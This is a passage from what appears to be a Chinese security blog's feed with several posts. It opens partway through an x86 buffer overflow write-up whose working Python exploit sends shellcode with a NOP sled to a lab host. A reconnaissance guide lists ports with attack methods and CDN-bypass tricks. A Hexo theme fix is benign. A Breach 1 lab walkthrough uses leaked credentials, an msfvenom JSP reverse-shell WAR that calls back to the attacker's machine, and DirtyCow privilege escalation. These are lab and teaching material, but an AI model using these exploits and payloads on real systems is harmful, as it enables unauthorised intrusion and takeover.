class="line">&quot;\x4a\x8d\x6e\x08\xc5\x86\x1d\x3a\x4a\x3d\x8a\x76\x03\x9b\x4d&quot;</span><br><span class="line">&quot;\x0f\x03\x1c\x81\xb7\x44\xe2\x22\xc7\x4d\x21\x76\x97\xe5\x80&quot;</span><br><span class="line">&quot;\xf7\x7c\xf6\x2d\x22\xe8\xfc\xb9\x0d\x44\x01\x39\xe6\x96\x02&quot;</span><br><span class="line">&quot;\x2c\xaa\x1f\xe4\x1e\x02\x4f\xb9\xde\xf2\x2f\x69\xb7\x18\xa0&quot;</span><br><span class="line">&quot;\x56\xa7\x22\x6b\xff\x42\xcd\xc5\x57\xfb\x74\x4c\x23\x9a\x79&quot;</span><br><span class="line">&quot;\x5b\x49\x9c\xf2\x69\xad\x53\xf3\x18\xbd\x84\x64\xe2\x3d\x55&quot;</span><br><span class="line">&quot;\x01\xe2\x57\x51\x83\xb5\xcf\x5b\xf2\xf1\x4f\xa3\xd1\x82\x88&quot;</span><br><span class="line">&quot;\x5b\xa4\xb2\xe3\x6a\x32\xfa\x9b\x92\xd2\xfa\x5b\xc5\xb8\xfa&quot;</span><br><span class="line">&quot;\x33\xb1\x98\xa9\x26\xbe\x34\xde\xfa\x2b\xb7\xb6\xaf\xfc\xdf&quot;</span><br><span class="line">&quot;\x34\x89\xcb\x7f\xc7\xfc\x4f\x87\x37\x82\x67\x20\x5f\x7c\x38&quot;</span><br><span class="line">&quot;\xd0\x9f\x16\xb8\x80\xf7\xed\x97\x2f\x37\x0d\x32\x78\x5f\x84&quot;</span><br><span class="line">&quot;\xd3\xca\xfe\x99\xf9\x8b\x5e\x99\x0e\x10\x51\xe0\x7f\xa7\x92&quot;</span><br><span class="line">&quot;\x15\x96\xcc\x93\x15\x96\xf2\xa8\xc3\xaf\x80\xef\xd7\x8b\x9b&quot;</span><br><span class="line">&quot;\x5a\x75\xbd\x31\xa4\x29\xbd\x13&quot;;</span><br></pre></td></tr></table></figure>

<p>注意，shellcode小于ESP大小</p>
<p>添加到py脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">shellcode =(<span class="string">&quot;\xd9\xc7\xbb\xfb\x85\x9a\xed\xd9\x74\x24\xf4\x5a\x31\xc9\xb1&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x56\x83\xea\xfc\x31\x5a\x14\x03\x5a\xef\x67\x6f\x11\xe7\xea&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x90\xea\xf7\x8a\x19\x0f\xc6\x8a\x7e\x5b\x78\x3b\xf4\x09\x74&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xb0\x58\xba\x0f\xb4\x74\xcd\xb8\x73\xa3\xe0\x39\x2f\x97\x63&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xb9\x32\xc4\x43\x80\xfc\x19\x85\xc5\xe1\xd0\xd7\x9e\x6e\x46&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xc8\xab\x3b\x5b\x63\xe7\xaa\xdb\x90\xbf\xcd\xca\x06\xb4\x97&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xcc\xa9\x19\xac\x44\xb2\x7e\x89\x1f\x49\xb4\x65\x9e\x9b\x85&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x86\x0d\xe2\x2a\x75\x4f\x22\x8c\x66\x3a\x5a\xef\x1b\x3d\x99&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x92\xc7\xc8\x3a\x34\x83\x6b\xe7\xc5\x40\xed\x6c\xc9\x2d\x79&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x2a\xcd\xb0\xae\x40\xe9\x39\x51\x87\x78\x79\x76\x03\x21\xd9&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x17\x12\x8f\x8c\x28\x44\x70\x70\x8d\x0e\x9c\x65\xbc\x4c\xc8&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x4a\x8d\x6e\x08\xc5\x86\x1d\x3a\x4a\x3d\x8a\x76\x03\x9b\x4d&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x0f\x03\x1c\x81\xb7\x44\xe2\x22\xc7\x4d\x21\x76\x97\xe5\x80&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xf7\x7c\xf6\x2d\x22\xe8\xfc\xb9\x0d\x44\x01\x39\xe6\x96\x02&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x2c\xaa\x1f\xe4\x1e\x02\x4f\xb9\xde\xf2\x2f\x69\xb7\x18\xa0&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x56\xa7\x22\x6b\xff\x42\xcd\xc5\x57\xfb\x74\x4c\x23\x9a\x79&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x5b\x49\x9c\xf2\x69\xad\x53\xf3\x18\xbd\x84\x64\xe2\x3d\x55&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x01\xe2\x57\x51\x83\xb5\xcf\x5b\xf2\xf1\x4f\xa3\xd1\x82\x88&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x5b\xa4\xb2\xe3\x6a\x32\xfa\x9b\x92\xd2\xfa\x5b\xc5\xb8\xfa&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x33\xb1\x98\xa9\x26\xbe\x34\xde\xfa\x2b\xb7\xb6\xaf\xfc\xdf&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x34\x89\xcb\x7f\xc7\xfc\x4f\x87\x37\x82\x67\x20\x5f\x7c\x38&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xd0\x9f\x16\xb8\x80\xf7\xed\x97\x2f\x37\x0d\x32\x78\x5f\x84&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xd3\xca\xfe\x99\xf9\x8b\x5e\x99\x0e\x10\x51\xe0\x7f\xa7\x92&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x15\x96\xcc\x93\x15\x96\xf2\xa8\xc3\xaf\x80\xef\xd7\x8b\x9b&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x5a\x75\xbd\x31\xa4\x29\xbd\x13&quot;</span>)</span><br><span class="line">buffer=<span class="string">&#x27;A&#x27;</span>*<span class="number">809</span>+<span class="string">&quot;\x83\x66\x62\x65&quot;</span>+<span class="string">&quot;\x90&quot;</span>*<span class="number">16</span>+shellcode+<span class="string">&quot;\x90&quot;</span>*<span class="number">4</span></span><br><span class="line"><span class="keyword">try</span>:    </span><br><span class="line">    print(<span class="string">&quot;Fuzz with &quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(buffer))+<span class="string">&quot;Bytes&quot;</span>)</span><br><span class="line">    s.connect((<span class="string">&#x27;192.168.1.245&#x27;</span>,<span class="number">4455</span>))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;OVRFLW &#x27;</span>+buffer+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;Done!&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">&quot;Could not connect&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>shellcode前面加了16个NOP，后面加了4个NOP<br>前面是通过调试的来，如果我们前面没有加NOP的情况，即</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buffer=<span class="string">&#x27;A&#x27;</span>*<span class="number">809</span>+<span class="string">&quot;\x83\x66\x62\x65&quot;</span>+shellcode+<span class="string">&quot;\x90&quot;</span>*<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/x86BOF/14.jpg" alt="14"></p>
<p>可以发现shellcode直接从83 EA FC ..开始<br>与我们生成的shellcode对比</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode =(<span class="string">&quot;\xd9\xc7\xbb\xfb\x85\x9a\xed\xd9\x74\x24\xf4\x5a\x31\xc9\xb1&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x56\x83\xea\xfc\x31\x5a\x14\x03\x5a\xef\x67\x6f\x11\xe7\xea&quot;</span>+</span><br></pre></td></tr></table></figure>

<p>前面16个shellcode被截断了，所以我们需要添加16个NOP用于被截断<br>后面添加NOP也是同理，防止shellcode与其他脏数据拼到一起</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buffer=<span class="string">&#x27;A&#x27;</span>*<span class="number">809</span>+<span class="string">&quot;\x83\x66\x62\x65&quot;</span>+<span class="string">&quot;\x90&quot;</span>*<span class="number">16</span>+shellcode+<span class="string">&quot;\x90&quot;</span>*<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>当然，我们ESP空间足够富足，所以我们可以使用技巧，多给前面加一些NOP，比如无脑先加40个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buffer=<span class="string">&#x27;A&#x27;</span>*<span class="number">809</span>+<span class="string">&quot;\x83\x66\x62\x65&quot;</span>+<span class="string">&quot;\x90&quot;</span>*<span class="number">40</span>+shellcode+<span class="string">&quot;\x90&quot;</span>*<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>这样的shellcode也是可以完美执行的</p>
<p><img src="/images/x86BOF/15.gif" alt="15"></p>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>x86</tag>
      </tags>
  </entry>
  <entry>
    <title>初步信息收集</title>
    <url>/2019/05/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="域名查询"><a href="#域名查询" class="headerlink" title="域名查询"></a>域名查询</h1><h2 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h2><p>可收集网络注册信息、注册的域名、IP地址等信息</p>
<a id="more"></a>

<p>注册人姓名、邮箱信息对个人站点非常有用，可挖掘更多信息<br><img src="/images/1.jpg" alt=""></p>
<h3 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h3><p>ICP备案查询和天眼查</p>
<h2 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h2><p>GHDB</p>
<table>
<thead>
<tr>
<th align="left">关键字</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">site</td>
<td align="left">指定域名</td>
</tr>
<tr>
<td align="left">inurl</td>
<td align="left">URL中存在关键字的网页</td>
</tr>
<tr>
<td align="left">intext</td>
<td align="left">网页正文中的关键字</td>
</tr>
<tr>
<td align="left">filetype</td>
<td align="left">指定文件类型</td>
</tr>
<tr>
<td align="left">intitle</td>
<td align="left">网页标题中的关键字</td>
</tr>
<tr>
<td align="left">link</td>
<td align="left">返回所有和输入域名做了链接的URL</td>
</tr>
<tr>
<td align="left">info</td>
<td align="left">查找指定站点基本信息</td>
</tr>
<tr>
<td align="left">cache</td>
<td align="left">搜索Google里关于某些内容的缓存</td>
</tr>
<tr>
<td align="left">例如:</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><img src="/images/2.jpg" alt=""></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Burpsuite Repeater模块</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">可以收集运行Server的类型及版本、PHP版本信息等</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><img src="/images/3.jpg" alt=""></td>
<td align="left"></td>
</tr>
</tbody></table>
<h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><p>我们可以在Google搜索中使用“site：”运算符来查找Google为域找到的所有子域。谷歌还支持额外的减号运算符，以排除我们对不感兴趣的子域名<br>site：*.wikimedia.org -www -store -jobs -uk</p>
<p>工具:Layer5.0修改版、subDomainBrute、Sublist3r、subdomainsniper</p>
<p>第三方DNS数据聚合<br><a href="https://www.virustotal.com/">https://www.virustotal.com</a><br><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p>
<p>证书透明度公开日志枚举<br><a href="https://crt.sh/">https://crt.sh</a><br><a href="https://censys.io/">https://censys.io</a></p>
<p>在线子域名爆破<br><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a><br>IP反查绑定域名<br><a href="https://dns.aizhan.com/">https://dns.aizhan.com</a></p>
<h2 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a>端口信息收集</h2><p>Nmap、御剑</p>
<p>常用端口及攻击方法</p>
<h3 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a>文件共享服务端口</h3><table>
<thead>
<tr>
<th align="left">端口号</th>
<th align="left">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="left">21/22/69</td>
<td align="left">Ftp/Tftp文件传输协议</td>
<td align="left">允许匿名的上传、下载、爆破或嗅探操作</td>
</tr>
<tr>
<td align="left">2049</td>
<td align="left">Nfs服务</td>
<td align="left">配置不当</td>
</tr>
<tr>
<td align="left">139</td>
<td align="left">Samba服务</td>
<td align="left">爆破、未授权访问、远程代码执行</td>
</tr>
<tr>
<td align="left">389</td>
<td align="left">Ldap</td>
<td align="left">注入、允许匿名访问、弱口令</td>
</tr>
</tbody></table>
<h3 id="远程连接服务端口"><a href="#远程连接服务端口" class="headerlink" title="远程连接服务端口"></a>远程连接服务端口</h3><table>
<thead>
<tr>
<th align="left">端口号</th>
<th align="left">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="left">22</td>
<td align="left">SSH远程连接</td>
<td align="left">爆破、SSH隧道及内网代理转发、文件传输</td>
</tr>
<tr>
<td align="left">23</td>
<td align="left">Telnet远程连接</td>
<td align="left">爆破、嗅探、弱口令</td>
</tr>
<tr>
<td align="left">3389</td>
<td align="left">Rdp远程桌面连接</td>
<td align="left">Shift后门(WinServer2003及以下系统)、爆破</td>
</tr>
<tr>
<td align="left">5900</td>
<td align="left">VNC</td>
<td align="left">弱口令爆破</td>
</tr>
<tr>
<td align="left">5632</td>
<td align="left">PyAnywhere服务</td>
<td align="left">抓密码、代码执行</td>
</tr>
</tbody></table>
<h3 id="Web应用服务端口"><a href="#Web应用服务端口" class="headerlink" title="Web应用服务端口"></a>Web应用服务端口</h3><table>
<thead>
<tr>
<th align="left">端口号</th>
<th align="left">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="left">80/443/8080</td>
<td align="left">常见Web服务端口</td>
<td align="left">Web攻击、爆破、对应服务器版本漏洞</td>
</tr>
<tr>
<td align="left">7001/7002</td>
<td align="left">WebLogic控制台</td>
<td align="left">Java反序列化、弱口令</td>
</tr>
<tr>
<td align="left">8080/8089</td>
<td align="left">Jboss/Resin/Jetty/Jenkins</td>
<td align="left">反序列化、控制台弱口令</td>
</tr>
<tr>
<td align="left">9090</td>
<td align="left">WebSphere控制台</td>
<td align="left">Java反序列化、弱口令</td>
</tr>
<tr>
<td align="left">4848</td>
<td align="left">GlassFish控制台</td>
<td align="left">弱口令</td>
</tr>
<tr>
<td align="left">1352</td>
<td align="left">Lotus domino邮件服务</td>
<td align="left">弱口令、信息泄露、爆破</td>
</tr>
<tr>
<td align="left">10000</td>
<td align="left">Webmin-Web控制面板</td>
<td align="left">弱口令</td>
</tr>
</tbody></table>
<h3 id="数据库服务端口"><a href="#数据库服务端口" class="headerlink" title="数据库服务端口"></a>数据库服务端口</h3><table>
<thead>
<tr>
<th align="left">端口号</th>
<th align="left">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="left">3306</td>
<td align="left">MySQL</td>
<td align="left">注入、提权、爆破</td>
</tr>
<tr>
<td align="left">1433</td>
<td align="left">MSSQL</td>
<td align="left">注入、提权、SA弱口令</td>
</tr>
<tr>
<td align="left">1521</td>
<td align="left">Oracle</td>
<td align="left">TNS爆破、注入、反弹Shell</td>
</tr>
<tr>
<td align="left">5432</td>
<td align="left">PostgreSQL</td>
<td align="left">爆破、注入、弱口令</td>
</tr>
<tr>
<td align="left">27017/27018</td>
<td align="left">MongoDB</td>
<td align="left">爆破、未授权访问</td>
</tr>
<tr>
<td align="left">6379</td>
<td align="left">Redis</td>
<td align="left">可尝试未授权访问、弱口令爆破</td>
</tr>
<tr>
<td align="left">5000</td>
<td align="left">SysBase/DB2</td>
<td align="left">爆破、注入</td>
</tr>
</tbody></table>
<h3 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a>邮件服务端口</h3><table>
<thead>
<tr>
<th align="left">端口号</th>
<th align="left">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="left">25</td>
<td align="left">SMTP邮件服务</td>
<td align="left">邮件伪造</td>
</tr>
<tr>
<td align="left">110</td>
<td align="left">POP3协议</td>
<td align="left">爆破、嗅探</td>
</tr>
<tr>
<td align="left">143</td>
<td align="left">IMAP协议</td>
<td align="left">爆破</td>
</tr>
</tbody></table>
<h3 id="网络常见协议端口"><a href="#网络常见协议端口" class="headerlink" title="网络常见协议端口"></a>网络常见协议端口</h3><table>
<thead>
<tr>
<th align="left">端口号</th>
<th align="left">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="left">53</td>
<td align="left">DNS域名系统</td>
<td align="left">允许区域传送、DNS劫持、缓存投毒、欺骗</td>
</tr>
<tr>
<td align="left">67/68</td>
<td align="left">DHCP服务</td>
<td align="left">劫持、欺骗</td>
</tr>
<tr>
<td align="left">161</td>
<td align="left">SNMP协议</td>
<td align="left">爆破、搜集目标内网信息</td>
</tr>
</tbody></table>
<h3 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a>特殊服务端口</h3><table>
<thead>
<tr>
<th align="left">端口号</th>
<th align="left">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="left">2181</td>
<td align="left">Zookpper</td>
<td align="left">未授权访问</td>
</tr>
<tr>
<td align="left">8069</td>
<td align="left">Zabbix</td>
<td align="left">远程执行、SQL注入</td>
</tr>
<tr>
<td align="left">9200/9300</td>
<td align="left">Elasticsearch</td>
<td align="left">远程执行</td>
</tr>
<tr>
<td align="left">11211</td>
<td align="left">Memcache</td>
<td align="left">未授权访问</td>
</tr>
<tr>
<td align="left">512/513/514</td>
<td align="left">Linux Rexec</td>
<td align="left">爆破、Rlogin登录</td>
</tr>
<tr>
<td align="left">873</td>
<td align="left">Rsync</td>
<td align="left">匿名访问、文件上传</td>
</tr>
<tr>
<td align="left">3690</td>
<td align="left">Svn服务</td>
<td align="left">Svn泄露、未授权访问</td>
</tr>
<tr>
<td align="left">50000</td>
<td align="left">SAP Management Console</td>
<td align="left">远程执行</td>
</tr>
</tbody></table>
<img src="/images/Port.jpg">

<h2 id="网站CMS指纹识别"><a href="#网站CMS指纹识别" class="headerlink" title="网站CMS指纹识别"></a>网站CMS指纹识别</h2><p>通过某些特性，识别网站CMS，查找相应漏洞<br><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a><br><a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a><br><a href="https://www.whatweb.net/">https://www.whatweb.net/</a></p>
<h2 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h2><h3 id="判断是否使用CDN"><a href="#判断是否使用CDN" class="headerlink" title="判断是否使用CDN"></a>判断是否使用CDN</h3><p>使用Ping目标主域，观察解析情况</p>
<p>进行全国多地区Ping<br><a href="https://www.17ce.com/">https://www.17ce.com/</a></p>
<h3 id="绕过CDN"><a href="#绕过CDN" class="headerlink" title="绕过CDN"></a>绕过CDN</h3><p>一般邮件系统在内部，未经过CDN解析，可以Ping邮件服务器的域名<br>扫描网站测试文件，如phpinfo，从而找到真实IP<br>扫描分站域名。主站访问量大会挂CDN，分站可能没挂，可以Ping二级域名获取分站IP。<br>国外访问。国内CDN一般只对国内用户的访问加速 <a href="https://asm.ca.com/zh_cn/ping.php">https://asm.ca.com/zh_cn/ping.php</a><br>查询域名解析记录。也许目标之前未使用CDN，可以通过NETCRAFT来观察域名IP历史记录<br>如果网站有自己的APP，可以尝试抓取APP的请求，找到真实IP</p>
<h3 id="敏感文件收集"><a href="#敏感文件收集" class="headerlink" title="敏感文件收集"></a>敏感文件收集</h3><p>探测Web目录结构和隐藏敏感文件，从而获取网站后台管理页面、文件上传页面，甚至扫描出网站源代码<br>工具:DirBuster、御剑后台扫描、wwwscan、Spinder.py、Sensitivefilescan、Weakfilescan</p>
<p>Github信息泄露</p>
]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
  </entry>
  <entry>
    <title>hexo&amp;next的常见配置问题</title>
    <url>/2020/11/19/hexo-next%E7%9A%84%E5%B8%B8%E8%A7%81%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>持续记录hexo或next主题一些可能遇到的错误</p>
<h2 id="锚点问题"><a href="#锚点问题" class="headerlink" title="锚点问题"></a>锚点问题</h2><p>页面左侧的中文标题锚点出现问题</p>
<p><img src="/images/Hexo&Next/1.png" alt="1"></p>
<p>编码问题，修改<code>\themes\next\source\js\utils.js</code>修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">registerSidebarTOC: function() &#123;</span><br><span class="line">  const navItems &#x3D; document.querySelectorAll(&#39;.post-toc li&#39;);</span><br><span class="line">  const sections &#x3D; [...navItems].map(element &#x3D;&gt; &#123;</span><br><span class="line">    var link &#x3D; element.querySelector(&#39;a.nav-link&#39;);</span><br><span class="line">    &#x2F;&#x2F; TOC item animation navigate.</span><br><span class="line">    link.addEventListener(&#39;click&#39;, event &#x3D;&gt; &#123;</span><br><span class="line">      event.preventDefault();</span><br><span class="line">      var target &#x3D; document.getElementById(event.currentTarget.getAttribute(&#39;href&#39;).replace(&#39;#&#39;, &#39;&#39;));</span><br><span class="line">      var offset &#x3D; target.getBoundingClientRect().top + window.scrollY;</span><br><span class="line">      window.anime(&#123;</span><br><span class="line">        targets  : document.scrollingElement,</span><br><span class="line">        duration : 500,</span><br><span class="line">        easing   : &#39;linear&#39;,</span><br><span class="line">        scrollTop: offset + 10</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    return document.getElementById(link.getAttribute(&#39;href&#39;).replace(&#39;#&#39;, &#39;&#39;));</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>添加decodeURI()，修改如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">registerSidebarTOC: function() &#123;</span><br><span class="line">  const navItems &#x3D; document.querySelectorAll(&#39;.post-toc li&#39;);</span><br><span class="line">  const sections &#x3D; [...navItems].map(element &#x3D;&gt; &#123;</span><br><span class="line">    var link &#x3D; element.querySelector(&#39;a.nav-link&#39;);</span><br><span class="line">    &#x2F;&#x2F; TOC item animation navigate.</span><br><span class="line">    link.addEventListener(&#39;click&#39;, event &#x3D;&gt; &#123;</span><br><span class="line">      event.preventDefault();</span><br><span class="line">      var target &#x3D; document.getElementById(decodeURI(event.currentTarget.getAttribute(&#39;href&#39;).replace(&#39;#&#39;, &#39;&#39;)));</span><br><span class="line">      var offset &#x3D; target.getBoundingClientRect().top + window.scrollY;</span><br><span class="line">      window.anime(&#123;</span><br><span class="line">        targets  : document.scrollingElement,</span><br><span class="line">        duration : 500,</span><br><span class="line">        easing   : &#39;linear&#39;,</span><br><span class="line">        scrollTop: offset + 10</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    return document.getElementById(decodeURI(link.getAttribute(&#39;href&#39;).replace(&#39;#&#39;, &#39;&#39;)));</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>hexo</category>
      </categories>
  </entry>
  <entry>
    <title>靶场Breach 1</title>
    <url>/2020/06/04/%E9%9D%B6%E5%9C%BA-Breach-1/</url>
    <content><![CDATA[<h1 id="Breach-1"><a href="#Breach-1" class="headerlink" title="Breach 1"></a>Breach 1</h1><p>攻击机:192.168.110.3</p>
<p>靶机:192.168.110.140</p>
<p>*注:该靶场需要配置静态IP:192.168.110.140</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Breach-1/1.jpg" alt="1"></p>
<p>端口扫描就遇到了问题，基本上全端口开放，显然是某种安全措施</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>查看80端口web服务，发现存在页面</p>
<p>查看网页源代码</p>
<p><img src="/images/Breach-1/2.jpg" alt="2"></p>
<p>存在一段Base64加密的字符串，对它进行解密</p>
<p><img src="/images/Breach-1/3.jpg" alt="3"></p>
<p>得到<code>pgibbons:damnitfeel$goodtobeagang$ta</code></p>
<p>之后发现页面图片存在链接，点击跳转</p>
<p><img src="/images/Breach-1/5.jpg" alt="5"></p>
<p>之后点击<code>Employee portal</code>,跳转<code>impresscms/user.php</code></p>
<p><img src="/images/Breach-1/6.jpg" alt="6"></p>
<p>发现了一个登录页面，尝试之前发现的账户密码</p>
<p>账号:pgibbons</p>
<p>密码:damnitfeel$goodtobeagang$ta</p>
<p><img src="/images/Breach-1/4.jpg" alt="4"></p>
<p>成功登录，左侧发现有3封邮件可以查看</p>
<p>第一封提示 Bill有一个非常安全的密码<br>第二封提示 机器上存在IDS/IPS<br>第三封提示 一个密钥文件在<code>192.168.110.140/.keystore</code></p>
<p>之后我又在主页面发现了一个SSL测试数据包</p>
<p><img src="/images/Breach-1/7.jpg" alt="7"></p>
<p>接着</p>
<p><img src="/images/Breach-1/8.jpg" alt="8"></p>
<p>而且该页面还提示<code>the alias, storepassword and keypassword are all set to &#39;tomcat&#39;</code></p>
<p>之后使用wireshark查看pcap包，内容全都被加密了，不过可以发现，大多数包都是走的8433端口</p>
<p><img src="/images/Breach-1/10.jpg" alt="10"></p>
<h3 id="keytool导出SSL证书"><a href="#keytool导出SSL证书" class="headerlink" title="keytool导出SSL证书"></a>keytool导出SSL证书</h3><p>想到之前的keystore文件，keytool的基本用法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令:</span><br><span class="line"> -certreq            生成证书请求</span><br><span class="line"> -changealias        更改条目的别名</span><br><span class="line"> -delete             删除条目</span><br><span class="line"> -exportcert         导出证书</span><br><span class="line"> -genkeypair         生成密钥对</span><br><span class="line"> -genseckey          生成密钥</span><br><span class="line"> -gencert            根据证书请求生成证书</span><br><span class="line"> -importcert         导入证书或证书链</span><br><span class="line"> -importpass         导入口令</span><br><span class="line"> -importkeystore     从其他密钥库导入一个或所有条目</span><br><span class="line"> -keypasswd          更改条目的密钥口令</span><br><span class="line"> -list               列出密钥库中的条目</span><br><span class="line"> -printcert          打印证书内容</span><br><span class="line"> -printcertreq       打印证书请求的内容</span><br><span class="line"> -printcrl           打印 CRL 文件的内容</span><br><span class="line"> -storepasswd        更改密钥库的存储口令</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breach-1/9.jpg" alt="9"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keytool -importkeystore -srckeystore c:\keystore -destkeystore c:\tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat</span><br><span class="line">-importkeystore    		从其他密钥库导入一个或所有条目</span><br><span class="line">-srckeystore          	源keystore文件</span><br><span class="line">-destkeystore         	新keystore文件</span><br><span class="line">-deststoretype       	证书格式</span><br><span class="line">-srcalias 	            源实体别名</span><br></pre></td></tr></table></figure>

<p>之后点击Edit→Preferences→Protocols→TLS</p>
<p><img src="/images/Breach-1/11.jpg" alt="11"></p>
<p>我们成功解密了HTTPS数据包</p>
<p><img src="/images/Breach-1/12.jpg" alt="12"></p>
<p>之后在数据包寻找线索</p>
<p><img src="/images/Breach-1/13.jpg" alt="13"></p>
<p>在数据包18中发现了疑似后台登录页面<code>/_M@nag3Me/html</code><br>找到了加密后的登录凭据<code>dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC</code></p>
<p><img src="/images/Breach-1/14.jpg" alt="14"></p>
<p>解密后tomcat:Tt\5D8F(#!*u=G)4m7zB</p>
<p>登录后台地址<code>https://192.168.110.140:8443/_M@nag3Me/html</code>，挂着burpsuite解决证书问题</p>
<p><img src="/images/Breach-1/15.jpg" alt="15"></p>
<p>输入账户密码</p>
<p><img src="/images/Breach-1/16.jpg" alt="16"></p>
<p>终于进入了后台</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="上传Getshell"><a href="#上传Getshell" class="headerlink" title="上传Getshell"></a>上传Getshell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;4444 -f war -o &#x2F;root&#x2F;Desktop&#x2F;evil.war</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breach-1/17.jpg" alt="17"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="dirtycow"><a href="#dirtycow" class="headerlink" title="dirtycow"></a>dirtycow</h3><p>直接使用脏牛提权</p>
<p><a href="https://github.com/exrienz/DirtyCow">https://github.com/exrienz/DirtyCow</a></p>
<p><img src="/images/Breach-1/18.jpg" alt="18"></p>
<h3 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h3><p>网上找到的，测试之后也是可以的，不过也太绕了</p>
<p><a href="https://www.freebuf.com/articles/system/171318.html">链接</a></p>
